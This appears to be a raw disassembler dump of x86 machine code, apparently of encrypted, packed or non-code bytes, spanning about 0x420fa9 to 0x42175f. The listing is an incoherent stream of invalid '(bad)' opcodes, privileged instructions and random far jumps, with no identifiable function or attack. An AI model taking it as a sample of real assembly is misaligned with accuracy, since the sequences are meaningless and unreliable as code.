  420fa9:	sub    edi,DWORD PTR [edx-0x1767a2e1]
  420faf:	dec    edi
  420fb0:	dec    ebp
  420fb1:	fiadd  WORD PTR [ebx+0x6f]
  420fb4:	adc    esp,DWORD PTR [edi+ecx*8+0x291bbde4]
  420fbb:	inc    edi
  420fbc:	int    0x37
  420fbe:	fwait
  420fbf:	jg     0x420f4b
  420fc1:	inc    ecx
  420fc2:	pop    ebx
  420fc3:	js     0x420fd0
  420fc5:	ins    BYTE PTR es:[edi],dx
  420fc6:	fstp   QWORD PTR [ecx]
  420fc8:	xchg   ebp,eax
  420fc9:	fcos   
  420fcb:	bswap  esi
  420fcd:	sub    ch,al
  420fcf:	and    al,0xab
  420fd1:	cld    
  420fd2:	cmp    eax,0x6b352c37
  420fd7:	ret    
  420fd8:	push   eax
  420fd9:	pusha  
  420fda:	mov    al,0x8d
  420fdc:	xor    al,0xb6
  420fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fdf:	jb     0x420fd2
  420fe1:	sbb    DWORD PTR [edx],0x6e
  420fe4:	mov    al,ds:0x83d44cd7
  420fe9:	pop    ebp
  420fea:	cld    
  420feb:	stos   DWORD PTR es:[edi],eax
  420fec:	or     BYTE PTR [ebx+0x39],cl
  420fef:	jl     0x420fff
  420ff1:	pop    ebx
  420ff2:	inc    ebx
  420ff3:	adc    DWORD PTR [edi],esi
  420ff5:	cmp    ah,BYTE PTR [edi-0x150c6d53]
  420ffb:	pop    ebp
  420ffc:	mov    bl,0xd4
  420ffe:	es push cs
  421000:	mov    dh,0xbb
  421002:	(bad)  
  421003:	add    esp,ecx
  421005:	retf   0xc608
  421008:	push   esi
  421009:	mov    bh,0x53
  42100b:	aam    0x74
  42100d:	inc    esp
  42100e:	pop    es
  42100f:	inc    esp
  421010:	int    0x11
  421012:	mov    dh,0xc
  421014:	imul   DWORD PTR [eax-0x16]
  421017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421018:	mov    esi,0x64a4a1af
  42101d:	mov    dh,BYTE PTR [ebp-0x69]
  421020:	mov    dh,BYTE PTR ds:0x5ac09f0c
  421026:	pop    edx
  421027:	jmp    0xc36d9ee7
  42102c:	jne    0x421071
  42102e:	mov    gs,WORD PTR ds:0x8fdf2c29
  421034:	call   0xfa1f6bf5
  421039:	sahf   
  42103a:	dec    esp
  42103b:	dec    edx
  42103c:	sahf   
  42103d:	pop    ss
  42103e:	push   0xffffffbb
  421040:	(bad)  
  421041:	jecxz  0x421022
  421043:	pop    ebx
  421044:	sub    esp,edx
  421046:	pop    ebx
  421047:	xchg   edx,eax
  421048:	sub    DWORD PTR [ebx],ebp
  42104a:	lock cli 
  42104c:	jmp    0x4210bc
  42104e:	clc    
  42104f:	mov    esi,0x8f3f0fbe
  421054:	jbe    0x4210d0
  421056:	push   ecx
  421057:	or     al,0xe
  421059:	lock xor BYTE PTR [eax-0x50],bl
  42105d:	pusha  
  42105e:	xchg   ebx,eax
  42105f:	lds    ebx,FWORD PTR [eax+0x1b]
  421062:	push   edi
  421063:	ret    
  421064:	fwait
  421065:	inc    eax
  421066:	imul   edx,DWORD PTR [ebx+0x276d11ca],0x6a
  42106d:	rcl    DWORD PTR [edi+0x3b],0xf1
  421071:	out    0x56,al
  421073:	or     eax,esi
  421075:	pop    ss
  421076:	lods   al,BYTE PTR ds:[esi]
  421078:	leave  
  421079:	in     eax,dx
  42107a:	push   ebx
  42107b:	mov    ah,dh
  42107d:	sub    dl,BYTE PTR [esi+edx*4+0x78]
  421081:	cmp    edx,DWORD PTR gs:[ebp+0x2f]
  421085:	jnp    0x421070
  421087:	or     dl,BYTE PTR [ebx-0x1f]
  42108a:	mov    cl,0xba
  42108c:	in     al,0x1
  42108e:	ja     0x4210c1
  421090:	xchg   ebx,eax
  421091:	adc    DWORD PTR cs:[ebp+0x3e],ecx
  421095:	fwait
  421096:	mov    bl,0xc0
  421098:	out    0xbb,eax
  42109a:	inc    eax
  42109b:	das    
  42109c:	adc    edx,ebp
  42109e:	xchg   ebp,eax
  42109f:	call   0x803d:0x7cca68f
  4210a6:	fs jb  0x421052
  4210a9:	popa   
  4210aa:	xlat   BYTE PTR ds:[ebx]
  4210ab:	xor    al,0x48
  4210ad:	fidivr WORD PTR [edi+0x24]
  4210b0:	xchg   DWORD PTR [ebp-0x36aae2d7],ebp
  4210b6:	or     esp,ebx
  4210b8:	sbb    DWORD PTR [ebx],0xfffffffe
  4210bb:	push   edx
  4210bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210bd:	int    0xd3
  4210bf:	pop    ebp
  4210c0:	push   eax
  4210c1:	jecxz  0x4210d7
  4210c3:	inc    eax
  4210c4:	icebp  
  4210c5:	mov    al,ds:0x35313a4c
  4210ca:	shl    eax,0x55
  4210cd:	int3   
  4210ce:	into   
  4210cf:	loop   0x4210ae
  4210d1:	(bad)  
  4210d2:	mov    edx,0x6f1f4ae9
  4210d7:	xor    ebp,ebx
  4210d9:	aaa    
  4210da:	pop    es
  4210db:	aam    0xf0
  4210dd:	sub    al,0x6f
  4210df:	dec    edi
  4210e0:	sbb    al,0x69
  4210e2:	sbb    eax,0x75ffb30b
  4210e7:	mov    WORD PTR [eax+0x47],es
  4210ea:	jb     0x4210c9
  4210ec:	rcr    DWORD PTR [edi-0x76],0x6e
  4210f0:	push   0x50
  4210f2:	les    ebx,FWORD PTR [edi+0x3b69936]
  4210f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210f9:	add    BYTE PTR [edi-0x57628507],dh
  4210ff:	(bad)  
  421100:	mov    ch,0xe9
  421102:	jae    0x421111
  421104:	add    al,0xa1
  421106:	rol    BYTE PTR [ebp+edi*2-0x3d16721b],1
  42110d:	ret    0xe940
  421110:	cdq    
  421111:	or     DWORD PTR [edi-0x36],edi
  421114:	inc    esi
  421115:	iret   
  421116:	nop
  421117:	data16 lahf 
  421119:	adc    BYTE PTR [edi-0x6b75178e],bh
  42111f:	inc    esp
  421120:	loop   0x4210c6
  421122:	jmp    0x421110
  421124:	xchg   edi,eax
  421125:	dec    edi
  421126:	jb     0x4210ff
  421128:	push   cs
  421129:	jnp    0x421155
  42112b:	pop    edx
  42112c:	xlat   BYTE PTR ds:[ebx]
  42112d:	cwde   
  42112e:	push   ecx
  42112f:	ins    DWORD PTR es:[edi],dx
  421130:	stos   BYTE PTR es:[edi],al
  421131:	popf   
  421132:	or     ah,BYTE PTR [ebx]
  421134:	dec    eax
  421135:	sbb    al,0x13
  421137:	sti    
  421138:	es aaa 
  42113a:	cmp    DWORD PTR ds:0x1ae3bc0e,esp
  421140:	mov    ebx,0x967e72a3
  421145:	pushf  
  421146:	aas    
  421147:	inc    ecx
  421148:	mov    WORD PTR [esi],cs
  42114a:	xor    BYTE PTR [esi-0x5d],0x0
  42114e:	dec    ebx
  42114f:	xor    esi,edi
  421151:	mov    ah,cl
  421153:	test   BYTE PTR [edx+0x5b],0xda
  421157:	mov    eax,ds:0x2169872a
  42115c:	sbb    DWORD PTR [edi+0x72],ebp
  42115f:	xor    DWORD PTR [ecx-0x60d02930],0x3b
  421166:	inc    ebp
  421167:	sub    DWORD PTR [ebp+0x3e8e0531],0x3
  42116e:	imul   bl
  421170:	mov    ds:0x1fa736db,eax
  421175:	xchg   esi,eax
  421176:	xchg   ecx,eax
  421177:	div    DWORD PTR [eax-0x6fe89982]
  42117d:	xlat   BYTE PTR ds:[ebx]
  42117e:	jecxz  0x4211b4
  421180:	pop    ebp
  421181:	fcom   DWORD PTR [ebx]
  421183:	bound  edi,QWORD PTR [ecx+0x67725095]
  421189:	pop    ebp
  42118a:	mov    dl,cl
  42118c:	ss or  bl,ah
  42118f:	mov    al,ds:0xdc00aeb3
  421194:	fmul   st,st(6)
  421196:	push   es
  421197:	mov    bh,0xa5
  421199:	mov    WORD PTR [eax-0x1e],cs
  42119c:	test   BYTE PTR [esi+0x6026bf9b],ah
  4211a2:	xor    esi,DWORD PTR [eax-0x12]
  4211a5:	les    edi,FWORD PTR ds:[esp+ecx*8]
  4211a9:	jecxz  0x4211a3
  4211ab:	mov    ?,esi
  4211ad:	call   0xeb41:0x77ffa20a
  4211b4:	xor    ebp,DWORD PTR [ecx+0x47]
  4211b7:	gs and eax,ebp
  4211ba:	cmp    eax,0xd69d4d64
  4211bf:	push   ebp
  4211c0:	les    edx,FWORD PTR [edx]
  4211c2:	fcmovb st,st(0)
  4211c4:	dec    ecx
  4211c5:	add    al,0x8b
  4211c7:	lea    esp,[edx+0x267f8c65]
  4211cd:	pop    esi
  4211ce:	xchg   ecx,eax
  4211cf:	mov    ds:0xe344278c,al
  4211d4:	pop    ebx
  4211d5:	sbb    eax,0xb71604a3
  4211da:	push   esp
  4211db:	cmc    
  4211dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211dd:	push   edi
  4211de:	inc    esi
  4211df:	cmp    ebp,DWORD PTR [ecx+0x20]
  4211e2:	lock adc ch,BYTE PTR [ebx+eax*1+0x2385a2e3]
  4211ea:	pop    eax
  4211eb:	mul    DWORD PTR [ebx]
  4211ed:	mov    ds:0x447d70df,al
  4211f2:	pop    ss
  4211f3:	mov    bl,0xd9
  4211f5:	sub    BYTE PTR [edx+0x73f4f427],dh
  4211fb:	es loope 0x421233
  4211fe:	cmp    BYTE PTR [ecx-0x3319ecc4],0x9c
  421205:	loop   0x421281
  421207:	out    dx,eax
  421208:	scas   al,BYTE PTR es:[edi]
  421209:	sbb    al,0x32
  42120b:	sbb    edx,DWORD PTR [esi+0x27]
  42120e:	hlt    
  42120f:	sbb    eax,0xfb9530fc
  421214:	clc    
  421215:	jbe    0x4211e9
  421217:	sar    edx,0x76
  42121a:	je     0x4211c1
  42121c:	ins    DWORD PTR es:[edi],dx
  42121d:	pop    esi
  42121e:	push   eax
  42121f:	inc    edx
  421220:	lds    ebx,FWORD PTR [edx]
  421222:	xchg   esp,eax
  421223:	xchg   edx,eax
  421224:	retf   
  421225:	push   0xbfb70f0c
  42122a:	xchg   edx,eax
  42122b:	aam    0x8f
  42122d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42122e:	sbb    BYTE PTR [esi],al
  421230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421232:	xchg   edx,eax
  421233:	sub    ch,BYTE PTR [edx+0x216599da]
  421239:	(bad)  
  42123a:	fcom   QWORD PTR [edx]
  42123c:	xchg   BYTE PTR [eax+0x58a1c02d],bh
  421242:	fdiv   QWORD PTR [ebx-0x93e3b8a]
  421248:	sbb    eax,0xc1dbe56f
  42124d:	gs test eax,0xa78a99d0
  421253:	adc    cl,BYTE PTR [ecx+0x24]
  421256:	push   ebp
  421257:	inc    edi
  421258:	push   eax
  421259:	mov    bl,0xcc
  42125b:	sti    
  42125c:	ja     0x4212b9
  42125e:	clc    
  42125f:	pop    esi
  421260:	jbe    0x42128a
  421262:	loop   0x4212d4
  421264:	mov    BYTE PTR [ebx-0x6cc56b39],ah
  42126a:	jne    0x421239
  42126c:	mov    dl,0xd9
  42126e:	xor    cl,BYTE PTR [edx-0x201bab19]
  421274:	lea    ebx,[ebp+0x41ab05ab]
  42127a:	sub    bl,BYTE PTR [ebp-0x55e72427]
  421280:	leave  
  421281:	and    dh,bh
  421283:	jp     0x421205
  421285:	jg     0x4212fa
  421287:	pop    ebp
  421288:	fcom   QWORD PTR [esi-0x59]
  42128b:	jo     0x421279
  42128d:	push   0x3959dc06
  421292:	rcl    BYTE PTR [eax+0x334d4c92],0xcb
  421299:	dec    ebx
  42129a:	push   0xb
  42129c:	jmp    0xe63de8f
  4212a1:	push   0x89aa4a77
  4212a6:	das    
  4212a7:	pop    ds
  4212a8:	imul   esp,DWORD PTR [ecx],0xc
  4212ab:	stos   BYTE PTR es:[edi],al
  4212ac:	pop    es
  4212ad:	adc    ch,BYTE PTR [ecx]
  4212af:	mov    eax,ds:0xd790b598
  4212b4:	xor    eax,0x45614d8a
  4212b9:	cli    
  4212ba:	retf   0xef
  4212bd:	adc    esi,eax
  4212bf:	je     0x4212ef
  4212c1:	in     al,0x40
  4212c3:	pop    ds
  4212c4:	hlt    
  4212c5:	addr16 inc edx
  4212c7:	lods   eax,DWORD PTR ds:[esi]
  4212c8:	enter  0x38c1,0xc5
  4212cc:	or     BYTE PTR [esi+0x30ee3dc9],bh
  4212d2:	test   BYTE PTR [eax-0x47394742],0x6d
  4212d9:	and    DWORD PTR [eax],ebp
  4212db:	sbb    al,0x64
  4212dd:	out    dx,al
  4212de:	lods   eax,DWORD PTR ds:[esi]
  4212df:	aam    0xd6
  4212e1:	mov    bh,cl
  4212e3:	xchg   ebp,eax
  4212e4:	mov    eax,0xf7432fd3
  4212e9:	cs cld 
  4212eb:	jecxz  0x4212e7
  4212ed:	jb     0x4212d8
  4212ef:	xor    al,0xe8
  4212f1:	mov    ds:0x7c7a453b,eax
  4212f6:	(bad)  
  4212f7:	pop    ss
  4212f8:	push   0x2d9fe9cd
  4212fd:	pop    ds
  4212fe:	loop   0x4212bb
  421300:	cs and al,bl
  421303:	(bad)  
  421304:	mov    eax,0x7bc98f8e
  421309:	xchg   edx,eax
  42130a:	jb     0x421297
  42130c:	cs mov edi,esp
  42130f:	out    0x78,eax
  421311:	jmp    0x3315:0x9339eebe
  421318:	ret    0x15c1
  42131b:	xlat   BYTE PTR ds:[ebx]
  42131c:	mov    esp,0x470a294
  421321:	cwde   
  421322:	lods   eax,DWORD PTR ds:[esi]
  421323:	push   esp
  421324:	or     eax,0x1f8e917b
  421329:	jl     0x421362
  42132b:	mov    esp,eax
  42132d:	xor    al,0x93
  42132f:	sbb    ecx,esp
  421331:	dec    edx
  421332:	cmp    al,0x98
  421334:	jae    0x42133f
  421336:	pusha  
  421337:	mov    ebx,DWORD PTR [esi]
  421339:	cmp    BYTE PTR [ecx],0x86
  42133c:	call   0x4617:0x86733c1f
  421343:	push   ds
  421344:	repz push ebp
  421346:	and    dl,ah
  421348:	and    DWORD PTR [esi],esp
  42134a:	pop    ebx
  42134b:	call   0xe3e7:0x51e663d3
  421352:	add    dl,BYTE PTR [ebx+0x6fcdcd5a]
  421358:	ret    
  421359:	or     bl,BYTE PTR [esi]
  42135b:	lea    esp,[edi-0x63be33b8]
  421361:	xor    BYTE PTR [esi-0x670c10bd],cl
  421367:	mov    DWORD PTR [ebp-0x7c],0x264015b1
  42136e:	loope  0x421381
  421370:	xchg   ebx,eax
  421371:	loopne 0x421370
  421373:	jnp    0x421300
  421375:	imul   esp,DWORD PTR ds:0xd0db9972,0x8318c2e7
  42137f:	mov    ah,0x74
  421381:	cwde   
  421382:	pop    eax
  421383:	xchg   ebx,eax
  421384:	in     al,dx
  421385:	test   bl,dh
  421387:	(bad)  
  421388:	dec    eax
  421389:	push   ecx
  42138a:	in     al,dx
  42138b:	mov    esi,0xa930a64a
  421390:	mov    WORD PTR [esp+ebx*8+0x2942c9d8],?
  421397:	sub    dh,cl
  421399:	jno    0x421382
  42139b:	jle    0x42133c
  42139d:	aad    0xc8
  42139f:	arpl   WORD PTR [edi+0x46],ax
  4213a2:	jmp    0x4213a3
  4213a4:	pop    ecx
  4213a5:	or     BYTE PTR ds:0x25367e78,ah
  4213ab:	dec    esp
  4213ac:	sub    dl,BYTE PTR [ebx+0x14]
  4213af:	pop    es
  4213b0:	sub    BYTE PTR [edx+0x14],bh
  4213b3:	jbe    0x4213f4
  4213b5:	jp     0x4213c2
  4213b7:	inc    edi
  4213b8:	cmp    DWORD PTR [ebp-0x17],ecx
  4213bb:	push   ebp
  4213bc:	int3   
  4213bd:	sub    BYTE PTR [ebx-0x7c9c6be8],0x6e
  4213c4:	outs   dx,BYTE PTR ds:[esi]
  4213c5:	loopne 0x4213d1
  4213c7:	add    DWORD PTR [ebx-0x1e],ebx
  4213ca:	or     eax,DWORD PTR [ebp-0x6f]
  4213cd:	sub    ah,ah
  4213cf:	shl    BYTE PTR [ebx],1
  4213d1:	and    al,0x29
  4213d3:	inc    edx
  4213d4:	jl     0x4213fa
  4213d6:	jns    0x4213e6
  4213d8:	jmp    0x42143f
  4213da:	mov    dh,0xbd
  4213dc:	out    0x4a,eax
  4213de:	mov    WORD PTR [edx],es
  4213e0:	add    eax,0xf3ec765f
  4213e5:	lock xchg esi,eax
  4213e7:	inc    esp
  4213e8:	repz inc eax
  4213ea:	cs jmp 0x83fc:0x9e6f60ae
  4213f2:	inc    ebp
  4213f3:	(bad)  
  4213f4:	sub    eax,0x8dafc047
  4213f9:	jg     0x421456
  4213fb:	cmp    eax,0x44384a44
  421400:	out    0xf3,eax
  421402:	jmp    0xd859:0x98b7fdf1
  421409:	adc    BYTE PTR [eax-0x46c34c29],bl
  42140f:	xchg   sp,ax
  421411:	cmp    BYTE PTR [ecx-0x6e],0x93
  421415:	fdiv   QWORD PTR [ebp-0x6e]
  421418:	out    dx,eax
  421419:	push   ebp
  42141a:	ins    BYTE PTR es:[edi],dx
  42141b:	outs   dx,BYTE PTR ds:[esi]
  42141c:	sub    ebp,DWORD PTR [ebx+0x4]
  42141f:	mov    bl,0x97
  421421:	mov    ch,0x9a
  421423:	fidiv  DWORD PTR [ebx+ebp*8]
  421426:	repz loope 0x421466
  421429:	mov    bl,0x62
  42142b:	shufps xmm2,XMMWORD PTR [edi],0xb
  42142f:	sub    al,0x81
  421431:	xlat   BYTE PTR ds:[ebx]
  421432:	sub    ebx,DWORD PTR [eax]
  421434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421435:	dec    ecx
  421436:	cmp    al,0x6d
  421438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421439:	add    DWORD PTR [edi+0x77],edx
  42143c:	push   esp
  42143d:	arpl   dx,ax
  42143f:	mov    cl,0xcb
  421441:	retf   0x44cb
  421444:	sub    dl,BYTE PTR [esi+0x57]
  421447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421448:	sub    BYTE PTR [eax],ah
  42144a:	div    DWORD PTR [edi-0x59]
  42144d:	ja     0x421492
  42144f:	push   ebp
  421450:	ret    
  421451:	test   eax,0x8c86652
  421456:	popf   
  421457:	(bad)
  42145b:	push   es
  42145c:	scas   eax,DWORD PTR es:[edi]
  42145d:	or     ebp,DWORD PTR ds:0x3d53ddc4
  421463:	ds sub esi,esp
  421466:	xor    DWORD PTR [edx],ecx
  421468:	fnstcw WORD PTR [ebp-0x3f]
  42146b:	retf   
  42146c:	push   ss
  42146d:	pusha  
  42146e:	mov    BYTE PTR [eax-0x37],ah
  421471:	popf   
  421472:	mov    es,WORD PTR [edx]
  421474:	mov    bl,0x19
  421476:	adc    cl,BYTE PTR [esi+0x71ca436a]
  42147c:	test   BYTE PTR [esi+0x15],dl
  42147f:	fidiv  DWORD PTR [eax]
  421481:	and    DWORD PTR [edx-0x4c],0x3f69ffeb
  421488:	(bad)  
  42148a:	mov    BYTE PTR [ebx+0x53],al
  42148d:	xchg   ebx,eax
  42148e:	ror    DWORD PTR [ecx-0x2721f404],0x70
  421495:	sub    ebx,DWORD PTR [eax-0x7dc749a6]
  42149b:	xlat   BYTE PTR ds:[ebx]
  42149c:	jne    0x421462
  42149e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42149f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a0:	imul   esp,ecx,0x35
  4214a3:	pop    ebp
  4214a4:	jnp    0x4214a9
  4214a6:	jp     0x421450
  4214a8:	dec    ecx
  4214a9:	ret    
  4214aa:	sub    al,0x3c
  4214ac:	cmp    dl,BYTE PTR [edi]
  4214ae:	in     al,0x71
  4214b0:	mov    ecx,0x72b5dfc2
  4214b6:	dec    ebx
  4214b7:	es (bad) 
  4214b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214ba:	cmp    esi,DWORD PTR [edi+0x25]
  4214bd:	lods   al,BYTE PTR ds:[esi]
  4214be:	xchg   ecx,eax
  4214bf:	(bad)
  4214c3:	inc    esi
  4214c4:	pop    eax
  4214c5:	or     bh,al
  4214c7:	push   edx
  4214c8:	mov    ds:0x286e88a,eax
  4214cd:	add    BYTE PTR [ecx],ch
  4214cf:	div    BYTE PTR [ecx+edi*8-0x75]
  4214d3:	shr    BYTE PTR [edi+0x15],cl
  4214d6:	out    dx,al
  4214d7:	sbb    esi,ebx
  4214d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214da:	jmp    0x4214f5
  4214dc:	push   ds
  4214dd:	(bad)  
  4214de:	xchg   edx,eax
  4214df:	mov    dl,0x7c
  4214e1:	fwait
  4214e2:	(bad)  
  4214e3:	xor    BYTE PTR [edi+0x687590cd],al
  4214e9:	rcl    DWORD PTR [ebx-0x14404f27],1
  4214ef:	sbb    al,0xcc
  4214f1:	mov    cl,0x59
  4214f3:	fild   QWORD PTR [ebx]
  4214f5:	hlt    
  4214f6:	adc    DWORD PTR [ebp-0x5f],eax
  4214f9:	scas   al,BYTE PTR es:[edi]
  4214fa:	loope  0x421545
  4214fc:	not    dl
  4214fe:	(bad)  
  421500:	push   ss
  421501:	das    
  421502:	mov    al,0x19
  421504:	add    edi,esp
  421506:	loope  0x421524
  421508:	fidiv  WORD PTR ds:0x8202d9d0
  42150e:	mov    ecx,0x5c354314
  421513:	shl    DWORD PTR ds:0x59617990,1
  421519:	lods   al,BYTE PTR ds:[esi]
  42151a:	pop    es
  42151b:	xchg   ebp,eax
  42151c:	pop    ebp
  42151d:	dec    ebp
  42151e:	popa   
  42151f:	test   DWORD PTR [ebp+0x48],eax
  421522:	xchg   ch,ch
  421524:	mov    BYTE PTR es:[edi+ecx*1+0x79c6a699],ah
  42152c:	ficomp WORD PTR [ecx]
  42152e:	push   ds
  42152f:	jmp    0x4215a8
  421531:	xor    DWORD PTR [eax],esi
  421533:	mov    cl,0x73
  421535:	mov    BYTE PTR [eax-0x63],dh
  421538:	aam    0x96
  42153a:	fcmovnu st,st(2)
  42153c:	mov    ch,0x92
  42153e:	(bad)  
  42153f:	aam    0x1e
  421541:	jecxz  0x4214c8
  421543:	jg     0x4214f0
  421545:	mov    WORD PTR [ebx],?
  421547:	adc    eax,DWORD PTR [edx+0x7806d08c]
  42154d:	fdiv   DWORD PTR [edx]
  42154f:	push   0x725496ae
  421554:	jmp    0x4215be
  421556:	add    eax,DWORD PTR [edi+0x3e]
  421559:	add    DWORD PTR [ebp-0x62a0582f],ecx
  42155f:	or     al,0x69
  421561:	jns    0x421590
  421563:	mov    es,WORD PTR [edi]
  421565:	and    al,0x13
  421567:	repz test eax,0xf5a5eaa
  42156d:	inc    edx
  42156e:	xchg   ecx,eax
  42156f:	pop    edi
  421570:	out    dx,al
  421571:	fsubr  DWORD PTR [eax+0x70]
  421574:	and    al,0x68
  421576:	(bad)  
  421578:	jg     0x421529
  42157a:	jg     0x4215e4
  42157c:	aam    0xc
  42157e:	add    ebp,DWORD PTR [esi-0x66189175]
  421584:	mov    ds:0x1fb29d5a,al
  421589:	cmp    esi,DWORD PTR ds:0x8d65fd71
  42158f:	mov    WORD PTR [ecx],ds
  421591:	push   esi
  421592:	xchg   esi,eax
  421593:	sahf   
  421594:	bound  ebp,QWORD PTR [ebx-0x8a243f8]
  42159a:	jp     0x42160e
  42159c:	xchg   BYTE PTR [edi-0x7],dl
  42159f:	sub    eax,0x5b6e920c
  4215a4:	xchg   ecx,eax
  4215a5:	or     BYTE PTR [esi-0x5696ff1],bh
  4215ab:	addr16 push ebp
  4215ad:	xchg   edx,eax
  4215ae:	inc    ebp
  4215af:	sub    eax,0x791a0cdf
  4215b4:	les    ecx,FWORD PTR [ecx+eiz*2]
  4215b7:	punpckhbw mm1,mm4
  4215ba:	cdq    
  4215bb:	dec    esi
  4215bc:	test   DWORD PTR [edi],ecx
  4215be:	out    dx,eax
  4215bf:	sub    DWORD PTR [esi+0x21aaff4f],edx
  4215c5:	(bad)  
  4215c6:	push   ds
  4215c7:	daa    
  4215c8:	xchg   edx,eax
  4215c9:	cwde   
  4215ca:	jmp    0x4d15:0xd5f8fd93
  4215d1:	mov    al,ds:0x71b6e2ab
  4215d6:	imul   edi,DWORD PTR [eax],0x4d
  4215d9:	sub    DWORD PTR [eax+0x63ea51cb],0xffffffe8
  4215e0:	xor    DWORD PTR [eax+eax*2],esp
  4215e3:	cs mov dh,0xbe
  4215e6:	loope  0x421646
  4215e8:	and    BYTE PTR [ebp-0x47],cl
  4215eb:	imul   edi,DWORD PTR [ebp+esi*4-0x3],0x3827fbbd
  4215f3:	xchg   ebp,edi
  4215f5:	push   es
  4215f6:	add    eax,0x577e43cd
  4215fb:	nop
  4215fc:	not    ecx
  4215fe:	adc    esi,esp
  421600:	mov    ch,0x62
  421602:	dec    esp
  421603:	rcl    DWORD PTR [ebx-0x475a2b8],1
  421609:	jg     0x421664
  42160b:	cmp    al,0xee
  42160d:	xor    BYTE PTR [ecx+0x5aaf3e72],al
  421613:	xchg   BYTE PTR [ebx],bl
  421615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421616:	mov    esi,0x624f43e
  42161b:	or     ch,bh
  42161d:	mov    edx,?
  42161f:	cli    
  421620:	add    DWORD PTR [ecx+0x6d2aba31],ebx
  421626:	add    BYTE PTR [esi],dl
  421628:	mov    dl,BYTE PTR [ecx]
  42162a:	fdiv   QWORD PTR [bp+di-0x58]
  42162e:	mov    dl,0xad
  421630:	jmp    FWORD PTR [ebp-0x1b]
  421633:	mov    cl,0x5e
  421635:	sar    DWORD PTR [ecx+0x4444506b],1
  42163b:	jne    0x4215c9
  42163d:	(bad)  
  42163f:	fidivr WORD PTR [ecx]
  421641:	mov    bh,BYTE PTR [ebx]
  421643:	add    al,BYTE PTR [eax+0x55fae77f]
  421649:	cmp    al,0x78
  42164b:	dec    edi
  42164c:	adc    DWORD PTR [edx],0xffffffef
  42164f:	jnp    0x421695
  421651:	jns    0x421614
  421653:	cs mov cl,0x1
  421656:	push   edx
  421657:	aas    
  421658:	push   ecx
  421659:	jnp    0x42166b
  42165b:	(bad)
  42165e:	daa    
  42165f:	push   cs
  421660:	into   
  421661:	sub    DWORD PTR [esi+ecx*2-0x1a],edi
  421665:	in     al,dx
  421666:	std    
  421667:	and    DWORD PTR [ebx],ebx
  421669:	test   DWORD PTR [esi-0x41d856e0],0xec016cae
  421673:	mov    ecx,0xc1af95d7
  421678:	adc    ecx,ecx
  42167a:	and    ecx,DWORD PTR [esi]
  42167c:	sub    eax,0x513ca6f9
  421681:	lds    ecx,FWORD PTR [ebp+0xc516a2f]
  421687:	cmp    DWORD PTR [esi-0x2],eax
  42168a:	dec    edi
  42168b:	sub    edi,DWORD PTR [edi+0x361d4838]
  421691:	xor    al,bl
  421693:	pop    ebp
  421694:	jo     0x421676
  421696:	adc    dl,dh
  421698:	std    
  421699:	sbb    BYTE PTR cs:[ebp+0xe],al
  42169d:	aas    
  42169e:	jae    0x4216aa
  4216a0:	loop   0x4216b9
  4216a2:	or     dh,BYTE PTR [ebp-0x15]
  4216a5:	cmp    BYTE PTR [ecx+0x50c0b8ef],ch
  4216ab:	mov    dh,0xde
  4216ad:	(bad)  
  4216af:	jg     0x4216cf
  4216b1:	lahf   
  4216b2:	and    BYTE PTR [ecx+0x29],0xb2
  4216b6:	call   0x63e5bbc7
  4216bb:	and    DWORD PTR [ebp-0x61],esi
  4216be:	call   0x146081f1
  4216c3:	cmp    esi,DWORD PTR [ebx+0x19]
  4216c6:	mov    esp,edi
  4216c8:	outs   dx,BYTE PTR ds:[esi]
  4216c9:	leave  
  4216ca:	push   eax
  4216cb:	pushf  
  4216cc:	aas    
  4216cd:	push   0x4b
  4216cf:	enter  0xc21b,0x99
  4216d3:	cdq    
  4216d4:	lods   al,BYTE PTR ds:[esi]
  4216d5:	dec    ebx
  4216d6:	int3   
  4216d7:	unpcklps xmm1,xmm1
  4216da:	mov    bl,0x8a
  4216dc:	sbb    edi,DWORD PTR [ebx]
  4216de:	arpl   WORD PTR [ebp+0x6],bp
  4216e1:	fs cmc 
  4216e3:	lea    eax,[eax+0x5c]
  4216e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216e7:	test   eax,0x36c3f13c
  4216ec:	adc    eax,0xf3c11800
  4216f1:	inc    eax
  4216f2:	jmp    0x604c:0xee4c70ca
  4216f9:	add    eax,0x9f286f09
  4216fe:	pushf  
  4216ff:	arpl   WORD PTR [ecx+0x11],sp
  421702:	dec    ecx
  421703:	sub    BYTE PTR ds:[ecx-0x16a6b8ba],al
  42170a:	sbb    dl,dh
  42170c:	mov    ch,0x89
  42170e:	shl    DWORD PTR [ebx-0x7e],0xf
  421712:	(bad)  
  421713:	test   esp,0xa903ac35
  421719:	jns    0x42170c
  42171b:	aam    0x78
  42171d:	scas   eax,DWORD PTR es:[edi]
  42171e:	xor    eax,0xc43cece7
  421723:	and    al,BYTE PTR [eax-0x3c65e319]
  421729:	adc    BYTE PTR [ebx+edx*8+0x3b],ch
  42172d:	push   ss
  42172e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42172f:	inc    esi
  421730:	sbb    eax,0xf7c30617
  421735:	fs ret 0xcb0e
  421739:	push   ecx
  42173a:	add    eax,0x6eda941d
  42173f:	push   ecx
  421740:	push   ecx
  421741:	test   ecx,eax
  421743:	or     DWORD PTR [ecx-0x38f43e88],edi
  421749:	mov    ?,ebx
  42174b:	call   0x2d43f749
  421750:	or     BYTE PTR [edx],dl
  421752:	in     al,0x47
  421754:	stc    
  421755:	push   esp
  421756:	jbe    0x421719
  421758:	popf   
  421759:	jmp    0x66e719ae
  42175e:	push   ds
  42175f:	xor    BYTE PTR [edi+0x78],dh
